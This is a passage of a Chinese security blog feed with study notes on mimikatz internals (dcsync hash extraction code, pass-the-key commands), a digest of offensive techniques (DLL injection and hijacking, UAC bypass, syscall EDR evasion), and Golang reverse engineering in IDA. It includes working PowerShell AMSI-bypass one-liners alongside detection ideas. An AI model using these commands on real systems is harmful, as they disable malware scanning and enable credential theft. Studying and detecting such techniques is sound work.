class="line"><span class="keyword">if</span>(status = kull_m_rpc_drsr_MakeAttid_addPrefixToTable(prefixTable, &amp;oidPrefix, &amp;ndx, toAdd))</div><div class="line">&#123;</div><div class="line">*att |= ndx &lt;&lt; <span class="number">16</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(L<span class="string">"kull_m_rpc_drsr_MakeAttid_addPrefixToTable\n"</span>);</div><div class="line">kull_m_asn1_freeEnc(oidPrefix.value);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> status;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后通过kull_m_rpc_drsr_findAttrNoOID()遍历整个ATTRBLOCK,ATTRBLOCK结构如下，包含了一个Count表示，ATTR列表的个数，ATTR为一个列表。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _ATTRBLOCK &#123;</div><div class="line">ULONG attrCount;</div><div class="line">ATTR *pAttr;</div><div class="line">&#125; ATTRBLOCK;</div><div class="line">/<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/</span></div><div class="line"><span class="regexp">/</span><span class="regexp">//</span>函数实现如下：</div><div class="line">ATTRVALBLOCK * kull_m_rpc_drsr_findAttrNoOID(ATTRBLOCK *attributes, ATTRTYP type)</div><div class="line">&#123;</div><div class="line">ATTRVALBLOCK *ptr = NULL;</div><div class="line">DWORD i;</div><div class="line">ATTR *attribut;</div><div class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; attributes-&gt;attrCount; i++)</div><div class="line">&#123;</div><div class="line">attribut = &amp;attributes-&gt;pAttr[i];</div><div class="line">if(attribut-&gt;attrTyp == type)</div><div class="line">&#123;</div><div class="line">ptr = &amp;attribut-&gt;AttrVal;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> ptr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>最后，就可以根据ATTRVALBLOCK结构，得到具体的属性值。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="title">typedef</span> struct _ATTRVAL &#123;</div><div class="line"><span class="type">ULONG</span> valLen;</div><div class="line"><span class="type">UCHAR</span> *pVal;</div><div class="line">&#125; <span class="type">ATTRVAL</span>;</div><div class="line"><span class="title">typedef</span> struct _ATTRVALBLOCK &#123;</div><div class="line"><span class="type">ULONG</span> valCount;</div><div class="line"><span class="type">ATTRVAL</span> *pAVal;</div><div class="line">&#125; <span class="type">ATTRVALBLOCK</span>;</div><div class="line">/////函数实现</div><div class="line"><span class="type">PVOID</span> kull_m_rpc_drsr_findMonoAttr(<span class="type">SCHEMA_PREFIX_TABLE</span> *prefixTable, <span class="type">ATTRBLOCK</span> *attributes, <span class="type">LPCSTR</span> szOid, <span class="type">PVOID</span> <span class="class"><span class="keyword">data</span>, <span class="type">DWORD</span> *size)</span></div><div class="line">&#123;</div><div class="line"><span class="type">PVOID</span> ptr = <span class="type">NULL</span>;</div><div class="line"><span class="type">ATTRVALBLOCK</span> *valblock;</div><div class="line"><span class="keyword">if</span>(<span class="class"><span class="keyword">data</span>)</span></div><div class="line">*(<span class="type">PVOID</span> *)<span class="class"><span class="keyword">data</span> = <span class="type">NULL</span>;</span></div><div class="line"><span class="keyword">if</span>(size)</div><div class="line">*size = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span>(valblock = kull_m_rpc_drsr_findAttr(prefixTable, attributes, szOid))  //得到据<span class="type">ATTRVALBLOCK</span>结构</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(valblock-&gt;valCount == <span class="number">1</span>)</div><div class="line">&#123;</div><div class="line">ptr = valblock-&gt;pAVal[<span class="number">0</span>].pVal;</div><div class="line"><span class="keyword">if</span>(<span class="class"><span class="keyword">data</span>)</span></div><div class="line">*(<span class="type">PVOID</span> *)<span class="class"><span class="keyword">data</span> = ptr;</span></div><div class="line"><span class="keyword">if</span>(size)</div><div class="line">*size = valblock-&gt;pAVal[<span class="number">0</span>].valLen;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">return ptr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>SID和NTLM</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_objectSid, &amp;data, NULL))</div><div class="line">&#123;</div><div class="line">kprintf(L<span class="string">"Object Security ID   : "</span>)<span class="comment">;</span></div><div class="line">kull_m_string_displaySID(data)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"\n"</span>)<span class="comment">;</span></div><div class="line">rid = *GetSidSubAuthority(data, *GetSidSubAuthorityCount(data) - <span class="number">1</span>)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"Object Relative ID   : %u\n"</span>, rid)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"\nCredentials:\n"</span>)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_unicodePwd, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"NTLM"</span>, FALSE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_ntPwdHistory, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"ntlm"</span>, TRUE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_dBCSPwd, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"LM  "</span>, FALSE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_lmPwdHistory, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"lm  "</span>, TRUE)<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul><h3 id="kerberos-golden-源码分析"><a href="#kerberos-golden-源码分析" class="headerlink" title="kerberos::golden 源码分析"></a>kerberos::golden 源码分析</h3><ul><li><a href="https://www.anquanke.com/post/id/257703" target="_blank" rel="external">mimikatz源码学习-Kerberos模块</a></li><li><a href="http://evilash.me/2021/12/24/Analyse-NoPac.html" target="_blank" rel="external">解析CVE-2021-42278和CVE-2021-42287</a>主要学习PAC结构</li></ul><h3 id="Pass-The-Ticket-检测"><a href="#Pass-The-Ticket-检测" class="headerlink" title="Pass The Ticket 检测"></a>Pass The Ticket 检测</h3><ul><li>在域控侧</li><li>1.在前期(也就是lsadump::dcsync)，通过检测流量定位DsGetNcChanges流量，判断来源IP是否是已知的域控ip地址。</li><li>2.在中期(也就是kerseros::ptt命令），通过检测流量，寻找在通讯流量中，缺省Kerberos通讯过程中第二第二步。因为黄金票据是伪造TGT的，自然不会有TGT请求的流量。</li><li>3.在后期，通过获取windows 事件，寻找关键的日志ID，进行分析<ul><li>3.1 寻找关键的ID(例如4769)</li><li>3.2 ID为4769的Kerberos登录事件中，登录的账户不在域中，说明是伪造的！因为这个账户可以是任意的<br>在非域控侧<br>1.检测mimikatz工具(有特征，例如yara，或者命令行)</li></ul></li></ul><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><h3 id="Pass-The-Key"><a href="#Pass-The-Key" class="headerlink" title="Pass The Key"></a>Pass The Key</h3><ul><li>又称为OverPass-The-Hash，因为在安装了KB2871997补丁的系统中，常规的非Administator账户是无法使用PtH进行横向传播的，但是可以使用AES进行Pth。</li><li>mimikatz “privilege::debug” “sekurlsa::ekeys” 获取想要的AES Hash</li><li>mimikatz sekurlsa::pth 进行PtK攻击</li></ul><h2 id="mimikatz检测与防御"><a href="#mimikatz检测与防御" class="headerlink" title="mimikatz检测与防御"></a>mimikatz检测与防御</h2><ul><li>yara检测:<a href="https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar</a>,原理是检测LogonSessionList全局变量的特征码。</li></ul><h2 id="lsadump-sam-源码分析"><a href="#lsadump-sam-源码分析" class="headerlink" title="lsadump::sam 源码分析"></a>lsadump::sam 源码分析</h2><ul><li>Ref<a href="https://zhuanlan.zhihu.com/p/34991269" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/34991269</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这是学习Mimikatz工作原理的无总结笔记。主要包含了&lt;code&gt;sekurlsa::msv&lt;/code&gt;,&lt;code&gt;sekurlsa::pth&lt;/code&gt;,&lt;code&gt;lsadump::dcsync&lt;/code&gt;,票据传递等功能的原理分析和检测。
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.9-4.15）学习</title>
    <link href="https://findream.github.io/2022/04/20/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.9-4.15%EF%BC%89/"/>
    <id>https://findream.github.io/2022/04/20/绿盟科技-每周蓝军技术推送（2022.4.9-4.15）/</id>
    <published>2022-04-20T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:50.895Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）"><a href="#0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）" class="headerlink" title="0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）"></a>0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）</h2><ul><li>原文链接：<a href="https://mp.weixin.qq.com/s/LN8k0J4lOn-ZV5LmDfSTBQ" target="_blank" rel="external">每周蓝军技术推送（2022.4.9-4.15）</a></li></ul><a id="more"></a><h2 id="0x01-修改内存中的-PE-头来注入-DLL-的一种方法"><a href="#0x01-修改内存中的-PE-头来注入-DLL-的一种方法" class="headerlink" title="0x01 修改内存中的 PE 头来注入 DLL 的一种方法"></a>0x01 修改内存中的 PE 头来注入 DLL 的一种方法</h2><ul><li><p><a href="https://www.x86matthew.com/view_post?id=import_dll_injection" target="_blank" rel="external">这篇文章</a>主要原理是：windows在装载程序的时候会根据导入表的数据装载所需要的Dll文件，<br>这篇文章的原理是通过在程序导出表中添加IID数组，然后在Resume主线程的时候，windows装载器便会加载所需要的dll实现dll注入。</p></li><li><p>这个办法缺点：</p><ul><li>1.是只能注入刚刚启动的进程，</li><li>2.还有敏感函数ResumeThead操作。好处就是不需要CreateRemoteThread函数。</li></ul></li></ul><h2 id="0x02-针对Office的DLL劫持研究"><a href="#0x02-针对Office的DLL劫持研究" class="headerlink" title="0x02 针对Office的DLL劫持研究"></a>0x02 针对Office的DLL劫持研究</h2><ul><li><p><a href="https://medium.com/@tamirye94/office-multiple-search-order-dll-hijacking-67e76001ecf1" target="_blank" rel="external">这篇文章</a>就讲了一个搜索顺序类型的dll劫持，而且现在微软并不认为这算是一个漏洞，所以短时间内应该是不会进行修复的。关于这种类型的dll劫持的检测思路可以是这样的：</p></li><li><p>因为Windows安全dll搜索顺序是这样，针对系统程序来说，其使用的dll多位于系统目录，要想目标dll能被劫持，目标dll的释放路径只可能在应用程序目录。</p><pre><code>1、加载应用程序的目录；2、系统目录，使用GetSystemDirectory函数获取该目录的路径；3、16位系统目录，没有获取该目录路径的函数，但会对该目录进行搜索；4、Windows目录，使用GetWindowsDirectory函数获取该目录的路径；5、当前目录；6、PATH环境变量中列出的目录。</code></pre></li><li>所以，我只需要寻找进程所加载dll的路径和进程路径一致的dll程序，并且在其他目录存在相同文件名称的dll，例如%system32%目录和%windows%。即可认为存在此类dll劫持。</li></ul><h2 id="0x03-AMSI-Bypass-的多种方法整理"><a href="#0x03-AMSI-Bypass-的多种方法整理" class="headerlink" title="0x03 AMSI Bypass 的多种方法整理"></a>0x03 AMSI Bypass 的多种方法整理</h2><ul><li><p>结合<a href="https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/" target="_blank" rel="external">这篇文章</a>，目前主要的ByPass AMSI的方法有两种，第1种是Patch amsi.dll文件。第2种是使amsi失效的方法。</p></li><li><p>1.通过patch AmsiScanBuffer函数，主要分为c#语言和ps语言。</p></li></ul><p>ref:<a href="https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998#file-my-am-bypass-ps1" target="_blank" rel="external">https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998#file-my-am-bypass-ps1</a></p><p>ref:<a href="https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs" target="_blank" rel="external">https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs</a></p><ul><li>2.通过反射Patch AmsiScanBuffer函数地址，为了避免被探测，其首先获取了DllGetClassObject的地址，然后通过暴力搜索特征码的方式获取AmsiScanBuffer进行patch</li></ul><p>ref:<a href="https://gist.github.com/shantanu561993/6483e524dc225a188de04465c8512909" target="_blank" rel="external">https://gist.github.com/shantanu561993/6483e524dc225a188de04465c8512909</a></p><ul><li>3.使amsi失效，通过设置System.Management.Automation.AmsiUtils的属性amsiInitFailed或者amsiContext使AMSI失效。</li></ul><p>[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)</p><p>Ref:<a href="https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1" target="_blank" rel="external">https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1</a></p><ul><li>使amsi失效，该方法会导致异常，而且windows已经针对部分字符串进行检测。但是可以混淆绕过。</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$mem</span> = [System.Runtime.InteropServices.Marshal]<span class="symbol">:</span><span class="symbol">:AllocHGlobal</span>(<span class="number">9076</span>)</div><div class="line">[Ref].Assembly.GetType(<span class="string">"System.Management.Automation.AmsiUtils"</span>).GetField(<span class="string">"amsiSession"</span>,<span class="string">"NonPublic,Static"</span>).SetValue(<span class="variable">$null</span>, <span class="variable">$null</span>);</div><div class="line">[Ref].Assembly.GetType(<span class="string">"System.Management.Automation.AmsiUtils"</span>).GetField(<span class="string">"amsiContext"</span>,<span class="string">"NonPublic,Static"</span>).SetValue(<span class="variable">$null</span>, [IntPtr]<span class="variable">$mem</span>)</div></pre></td></tr></table></figure><h2 id="0x04-Windows特权句柄利用分析"><a href="#0x04-Windows特权句柄利用分析" class="headerlink" title="0x04 Windows特权句柄利用分析"></a>0x04 Windows特权句柄利用分析</h2><ul><li><p><a href="https://mp.weixin.qq.com/s/VJEgxfcuDRKMGBdkrXyRlA" target="_blank" rel="external">这篇文章</a>所描述的是，通过Hunt系统中的高完整性级别的句柄，来进行ByPass UAC。其原理和之前推得一篇文章很相似。<br>那篇原理是通过拉起某些自动提升UAC权限的进程，然后通过dump进程句柄实现的。这篇是寻找高完整性句柄，并以此启动进程进行ByPassUAC。</p></li><li><p>再讲一下为什么只需要获取高完整性级别的Handle就可以进行ByPass UAC。ByPassUAC原理就是父子进程的完整性级别是继承的，在创建进程之前的CreateProcess函数，会设置一个名为STARTUPINFOEXW结构体。其保存了一些启动信息。当我们创建进程之前，提前设置STARTUPINFOEXW的lpAttributeList元素，就可以是新创建的进程具有使用泄露句柄的进程完整性级别。关于UpdateProcThreadAttribute用法，可以看这篇文章<a href="https://blog.csdn.net/linlin003/article/details/108864860" target="_blank" rel="external">https://blog.csdn.net/linlin003/article/details/108864860</a></p></li></ul><h2 id="0x05-探索Windows-内核中的系统调用"><a href="#0x05-探索Windows-内核中的系统调用" class="headerlink" title="0x05 探索Windows 内核中的系统调用"></a>0x05 探索Windows 内核中的系统调用</h2><ul><li><p>这篇文章主要讲的是通过syscall绕过EDR产品的原理，因为EDR或者杀毒软件通常会在一些敏感函数下Hook，部分杀软Hook的地方比较偏向应用层，因为内核层搞事情容易蓝屏，而syscall位于ntdll中的Nt*函数，通过直接调用Nt函数，这样就可以绕过部分杀毒软件。</p></li><li><p>目前来说，我比较看好的项目<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="external">SysWhisoers2 </a>，国内有大佬也总结了syscall几个很好的项目。<a href="https://tttang.com/archive/1464/#toc_syswhisoers2" target="_blank" rel="external">syscall的前世今生</a></p></li><li><p>但是，Syscall Bypass这种技术，目前对于普通使用者来说难度较大，因为Nt*更接近于底层，没有暴露的API接口使用，部分结构体甚至没有公布，只能通过Re的方法进行了解。所以，需要自己写一套Stub去调用Nt函数。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）&quot;&gt;&lt;a href=&quot;#0x00-绿盟科技-每周蓝军技术推送（2022-4-9-4-15）&quot; class=&quot;headerlink&quot; title=&quot;0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）&quot;&gt;&lt;/a&gt;0x00 绿盟科技-每周蓝军技术推送（2022.4.9-4.15）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://mp.weixin.qq.com/s/LN8k0J4lOn-ZV5LmDfSTBQ&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.4.9-4.15）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Golang Reverse</title>
    <link href="https://findream.github.io/2021/11/02/Golang%20Reverse/"/>
    <id>https://findream.github.io/2021/11/02/Golang Reverse/</id>
    <published>2021-11-02T12:45:11.000Z</published>
    <updated>2022-04-30T09:41:16.137Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-idapython-调试"><a href="#0x00-idapython-调试" class="headerlink" title="0x00 idapython 调试"></a>0x00 idapython 调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;配置好IDA 7.5 免安装版之后，可以正常使用idapython，但是在import idc会报错。修改<code>%IDA_7.5%\python\3\ida_idaapi.py</code>文件，在第80行，添加如下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sys<span class="selector-class">.modules</span>[<span class="string">"__main__"</span>]<span class="selector-class">.IDAPYTHON_COMPAT_695_API</span> = True</div></pre></td></tr></table></figure></p><p>  <img src="http://hacky.wang/blog/20210711/opAdW5ctvdze.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在vscode添加插件idacode<br>    <img src="http://hacky.wang/blog/20210711/oAt11UWv7kxW.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在IDA pro 安装插件，在<a href="https://github.com/ioncodes/idacode/releases" target="_blank" rel="external">https://github.com/ioncodes/idacode/releases</a>处下载。解压到%IDAPATH%/plugins中。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;编辑 <code>idacode_utils/settings.py</code>，把 Python 的可执行文件路径改为自己电脑上 Python 的路径<br>    <img src="http://hacky.wang/blog/20210711/yo6yEXmAtGx2.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重新打开，在输出窗口就能看到是否成功，可能会提示缺少模块，可以通过Pip安装模块debugpy<br>    <img src="http://hacky.wang/blog/20210711/e6bruJAYtJnm.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 安装成功就是这样的。<br>    <img src="http://hacky.wang/blog/20210711/vIx9aM2Dq8tL.png?imageslim" alt="mark"></p><a id="more"></a><h2 id="0x01-idapython-函数"><a href="#0x01-idapython-函数" class="headerlink" title="0x01 idapython 函数"></a>0x01 idapython 函数</h2><h2 id="0x02-pclntab及如何定位pclntab"><a href="#0x02-pclntab及如何定位pclntab" class="headerlink" title="0x02 pclntab及如何定位pclntab"></a>0x02 pclntab及如何定位pclntab</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pclntab 全称为 Program Counter Line Table(程序计数器行数映射表)。对应汇编中，可以简单的理解为EIP。其结构体定义如下：<br><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> LineTable <span class="keyword">struct</span> &#123;</div><div class="line">Data []<span class="keyword">byte</span></div><div class="line">PC   <span class="keyword">uint64</span></div><div class="line">Line <span class="keyword">int</span></div><div class="line"></div><div class="line"><span class="comment">// This mutex is used to keep parsing of pclntab synchronous.</span></div><div class="line">mu sync.Mutex</div><div class="line"></div><div class="line"><span class="comment">// Contains the version of the pclntab section.</span></div><div class="line">version version</div><div class="line"></div><div class="line"><span class="comment">// Go 1.2/1.16 state</span></div><div class="line">binary      binary.ByteOrder</div><div class="line">quantum     <span class="keyword">uint32</span></div><div class="line">ptrsize     <span class="keyword">uint32</span></div><div class="line">funcnametab []<span class="keyword">byte</span></div><div class="line">cutab       []<span class="keyword">byte</span></div><div class="line">funcdata    []<span class="keyword">byte</span></div><div class="line">functab     []<span class="keyword">byte</span></div><div class="line">nfunctab    <span class="keyword">uint32</span></div><div class="line">filetab     []<span class="keyword">byte</span></div><div class="line">pctab       []<span class="keyword">byte</span> <span class="comment">// points to the pctables.</span></div><div class="line">nfiletab    <span class="keyword">uint32</span></div><div class="line">funcNames   <span class="keyword">map</span>[<span class="keyword">uint32</span>]<span class="keyword">string</span> <span class="comment">// cache the function names</span></div><div class="line">strings     <span class="keyword">map</span>[<span class="keyword">uint32</span>]<span class="keyword">string</span> <span class="comment">// interned substrings of Data, keyed by offset</span></div><div class="line"><span class="comment">// fileMap varies depending on the version of the object file.</span></div><div class="line"><span class="comment">// For ver12, it maps the name to the index in the file table.</span></div><div class="line"><span class="comment">// For ver116, it maps the name to the offset in filetab.</span></div><div class="line">fileMap <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">uint32</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于我们来说比较重要的主要是函数名称表和原文件表，我将其简单划分成了三个部分,分别是pclntab_header，func_tbl_entry，srcfile_tbl_entry：</p><ul><li>pclntab_header：这是pclntab的头部，包含pclntab的幻字，架构，以及字节宽度</li><li>func_tbl：存储了函数个数，以及函数的地址，函数的Function Struct结构的偏移组成的一个list</li><li>src_tbl:存储了src_file的个数，以及指向src_file字符串的地址的偏移<figure class="highlight rust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">type</span> <span class="title">pclntab</span></span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">   <span class="class"><span class="keyword">type</span> <span class="title">pclntab_header</span></span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">   &#123;</span></div><div class="line">      <span class="comment">//sizeof(pclntab_header) == 8</span></div><div class="line">      DWORD Magic_Number  <span class="comment">//+0x00 幻字</span></div><div class="line">      WORD Unknow         <span class="comment">//+0x04 暂无他用</span></div><div class="line">      BYTE min_lc         <span class="comment">//+0x06 instruction size quantum  --&gt;1 为 x86, 4 为 ARM</span></div><div class="line">      BYTE ptr_sz         <span class="comment">//+0x07 size of uintptr ---&gt;32bit 的为 4，64 bit 的为 8</span></div><div class="line">   &#125;</div><div class="line">   <span class="class"><span class="keyword">type</span> <span class="title">func_tbl</span></span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">   &#123;</span></div><div class="line">      DWORD NumOfFunc    <span class="comment">//+0x08 number of function</span></div><div class="line"></div><div class="line">      DWORD func_addr1   <span class="comment">//+0x0B address of function1</span></div><div class="line">      DWORD offset_of_funcstruct1 <span class="comment">//+0x0F offset of func struct</span></div><div class="line">      DWORD func_addr2   <span class="comment">//+0x0B address of function1</span></div><div class="line">      DWORD offset_of_funcstruct2 <span class="comment">//+0x0F offset of func struct</span></div><div class="line">      ............</div><div class="line">   &#125;</div><div class="line">   <span class="class"><span class="keyword">type</span> <span class="title">srcfile_tbl</span></span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">   &#123;</span></div><div class="line">      DWORD NumOfScrFile</div><div class="line">      DWORD offset_of_srcfile1  <span class="comment">//+0x(sizeof(func_tbl)+ ptr_sz)</span></div><div class="line">      ..............</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pclntab_header结构是定位pclntab的关键，因为pclntab_header存在MagicNumber为0xFFFFFFFB，所以只需要在文件中遍历0xFFFFFFFB，以及确定min_lc或者ptr_sz值的有效性即可。<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># Traverse the <span class="keyword">data</span> segment to search <span class="keyword">for</span> the signature code <span class="number">0xFFFFFFFB</span></div><div class="line">curr_addr = mdata_seg_addr</div><div class="line"><span class="keyword">while</span> curr_addr &lt; idc.BADADDR:</div><div class="line">    <span class="keyword">if</span> idc.get_qword(read_mem(curr_addr,<span class="number">4</span>))&amp;<span class="number">0xFFFFFFFF</span> == <span class="number">0xFFFFFFFB</span>:</div><div class="line">        <span class="keyword">if</span> is_firstmoduledata(curr_addr):</div><div class="line">            first_moduledata_addr = curr_addr</div><div class="line">            <span class="keyword">return</span> first_moduledata_addr</div><div class="line">    curr_addr = curr_addr + <span class="number">1</span></div><div class="line"><span class="keyword">return</span> 